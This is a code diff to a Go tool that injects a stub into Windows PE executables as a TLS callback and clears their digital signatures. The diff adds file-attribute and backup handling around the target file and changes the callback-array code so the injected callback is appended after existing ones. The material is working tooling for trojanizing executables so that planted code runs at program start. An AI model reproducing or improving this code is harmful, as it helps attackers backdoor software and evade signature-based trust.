@@ -11,8 +11,37 @@ import (
 	"os"
 	"regexp"
 	"strings"
+	"syscall"
 	"unsafe"
 )
+
+// Constants for file attributes
+const (
+	FILE_ATTRIBUTE_ARCHIVE  = 0x20
+	FILE_ATTRIBUTE_READONLY = 0x01
+)
+
+// SetFileAttributes sets the file attributes using Windows API
+func SetFileAttributes(filename string, attrs uint32) error {
+	p, err := syscall.UTF16PtrFromString(filename)
+	if err != nil {
+		return err
+	}
+	return syscall.SetFileAttributes(p, attrs)
+}
+
+// GetFileAttributes gets the file attributes using Windows API
+func GetFileAttributes(filename string) (uint32, error) {
+	p, err := syscall.UTF16PtrFromString(filename)
+	if err != nil {
+		return 0, err
+	}
+	attrs, err := syscall.GetFileAttributes(p)
+	if err != nil {
+		return 0, err
+	}
+	return attrs, nil
+}
 
 func main() {
 	if len(os.Args) < 4 {
@@ -35,6 +64,8 @@ func main() {
 
 	fmt.Println(args)
 
+	fileArch := false
+
 	mod := args[0]
 	modify := args[1]
 	textpath := args[2]
@@ -42,6 +73,30 @@ func main() {
 	var cert []byte
 
 	fmt.Println(*sign)
+
+	backupFile(modify)
+
+	// Get current file attributes
+	attrs, err := GetFileAttributes(modify)
+	if err != nil {
+		fmt.Println("Error getting file attributes:", err)
+		return
+	}
+
+	// Check if the file is "-ar"
+	if attrs&FILE_ATTRIBUTE_ARCHIVE != 0 && attrs&FILE_ATTRIBUTE_READONLY != 0 {
+		fmt.Println("File has '-ar' attributes")
+		fileArch = true
+
+		// Set file attributes to "a"
+		err := SetFileAttributes(modify, FILE_ATTRIBUTE_ARCHIVE)
+		if err != nil {
+			fmt.Println("Error setting attributes to 'a':", err)
+			return
+		}
+		fmt.Println("Attributes set to 'a'")
+
+	}
 
 	switch mod {
 	case "function":
@@ -79,6 +134,16 @@ func main() {
 		}
 	default:
 		fmt.Println("wrong mode")
+	}
+
+	if fileArch == true {
+		// Set file attributes back to "-ar"
+		err = SetFileAttributes(modify, FILE_ATTRIBUTE_ARCHIVE|FILE_ATTRIBUTE_READONLY)
+		if err != nil {
+			fmt.Println("Error setting attributes back to 'ar':", err)
+			return
+		}
+		fmt.Println("Attributes set back to 'ar'")
 	}
 
 }
@@ -265,10 +330,15 @@ func tlsInject(exeData []byte, ptrStubData []byte, pathToWrite string) bool {
 			log.Printf("Invalid AddressOfCallBacks offset: %d", k)
 			return false
 		}
-		addrOfCBackSaveAt := (*[2]uint64)(unsafe.Pointer(&exeData[k]))
-		numOfCBacks := len(addrOfCBackSaveAt)
-		addrOfCBackSaveAt[numOfCBacks-1] = ntHeaders.OptionalHeader.ImageBase + uint64(sakeSection.VirtualAddress)
-		addrOfCBackSaveAt[numOfCBacks] = 0
+		// 动态计算回调数组的长度
+		addrOfCBackSaveAt := (*[1 << 30]uint64)(unsafe.Pointer(&exeData[k])) // 假设最大长度为1<<30
+		numOfCBacks := 0
+		for i := 0; addrOfCBackSaveAt[i] != 0; i++ {
+			numOfCBacks++
+		}
+
+		addrOfCBackSaveAt[numOfCBacks] = ntHeaders.OptionalHeader.ImageBase + uint64(sakeSection.VirtualAddress)
+		addrOfCBackSaveAt[numOfCBacks+1] = 0
 	}
 
 	fileSakeSize := alignUp(sakeUsed+uint32(len(ptrStubData)), ntHeaders.OptionalHeader.FileAlignment)
@@ -848,4 +918,26 @@ func clearcert(path string) {
 	file.Write(emptyCert)
 
 	fmt.Println("[*] Signature cleared successfully")
+}
+
+// backupFile creates a backup of the given file
+func backupFile(filepath string) error {
+	srcFile, err := os.Open(filepath)
+	if err != nil {
+		return err
+	}
+	defer srcFile.Close()
+
+	destFile, err := os.Create(filepath + ".bak")
+	if err != nil {
+		return err
+	}
+	defer destFile.Close()
+
+	_, err = io.Copy(destFile, srcFile)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
